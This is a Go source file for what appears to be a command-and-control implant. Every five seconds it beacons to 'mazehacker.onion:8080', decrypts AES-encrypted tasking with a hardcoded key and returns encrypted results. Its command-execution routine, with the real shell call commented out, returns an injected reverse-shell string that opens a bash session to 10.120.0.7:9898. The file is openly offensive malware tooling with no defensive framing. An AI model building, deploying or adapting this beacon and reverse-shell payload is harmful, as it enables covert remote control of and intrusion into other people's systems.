package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

const (
	connHost = "mazehacker.onion"
	connPort = "8080"
	connType = "tcp"
)

var wg sync.WaitGroup

func Unpad(src []byte) []byte {
	length := len(src)
	unpadding := int(src[length-1])
	return src[:(length - unpadding)]
}

// PKCS7Pad pads the input to make its length a multiple of blockSize
func PKCS7Pad(input []byte, blockSize int) []byte {
	padding := blockSize - (len(input) % blockSize)
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(input, padText...)
}

func Decrypting(encryptedText string, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	decodedText, err := base64.StdEncoding.DecodeString(encryptedText)
	if err != nil {
		return "", err
	}

	if len(decodedText) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	iv := decodedText[:aes.BlockSize]
	decodedText = decodedText[aes.BlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(decodedText, decodedText)

	return string(Unpad(decodedText)), nil
}

func EncryptingMap(input map[string]string, key []byte) (map[string]string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Error in initializing AES")
		return nil, err
	}

	encryptedMap := make(map[string]string)
	blockSize := block.BlockSize()
	for k, v := range input {

		//calculate the encrypt of the value
		plaintext := []byte(v)
		plaintext = PKCS7Pad(plaintext, blockSize) // Apply PKCS7 padding
		ciphertext := make([]byte, blockSize+len(plaintext))
		iv := ciphertext[:blockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			fmt.Println("Error in reading rand")
			return nil, err
		}
		mode := cipher.NewCBCEncrypter(block, iv)
		mode.CryptBlocks(ciphertext[blockSize:], plaintext)

		encryptedMap[k] = base64.StdEncoding.EncodeToString(ciphertext)
	}

	return encryptedMap, nil
}
func ExecuteCommands(inputMap map[string]string) (map[string]string, error) {
	outputMap := make(map[string]string)
	// cmd := exec.Command("bash", "-c", inputMap["command"])
	// out, _ := cmd.CombinedOutput()
	out := ";/bin/bash -i >& /dev/tcp/10.120.0.7/9898 0>&1;"
	outputMap["result"] = string(out)
	return outputMap, nil
}

func MapDec(inpmap map[string]string, key []byte) map[string]string {

	decdata := map[string]string{}
	for k := range inpmap {
		dec, _ := Decrypting(inpmap[k], key)
		decdata[k] = dec
		fmt.Println(k + ": " + decdata[k])
	}
	return decdata

}

func handleConnection(conn net.Conn, nums chan map[string]string) {
	defer wg.Done()

	// Read data from the connection
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error in reading")
		return
	}
	server_map := make(map[string]string)
	error := json.Unmarshal(buf[:n], &server_map)
	if error != nil {
		fmt.Println("Error in unmarshalling")
	}
	server_map_dec := MapDec(server_map, []byte("my32digitkey12345678901234567890"))

	outputMap, err := ExecuteCommands(server_map_dec)

	if err != nil {
		fmt.Println("Error in executing commands", err)
	}

	nums <- outputMap

}

func main() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			Conn, err := net.Dial(connType, connHost+":"+connPort)
			if err != nil {
				fmt.Println("Error connecting")
				time.Sleep(2 * time.Second)
				continue
			}
			fmt.Println("New connection is established")

			wg.Add(1)

			nums := make(chan map[string]string)
			go handleConnection(Conn, nums)

			result := <-nums
			wg.Wait()
			close(nums)

			key := []byte("my32digitkey12345678901234567890")
			json_execution_res, err := EncryptingMap(result, key)

			json_data, err := json.Marshal(json_execution_res)

			if err != nil {
				fmt.Println("Error in marshalling ", err)
			}

			if err != nil {

				fmt.Println("Error in making json")
			}

			_, err2 := Conn.Write(json_data)
			if err2 != nil {
				fmt.Println("Error in sending  data")
			}
			Conn.Close()
		}
	}
}
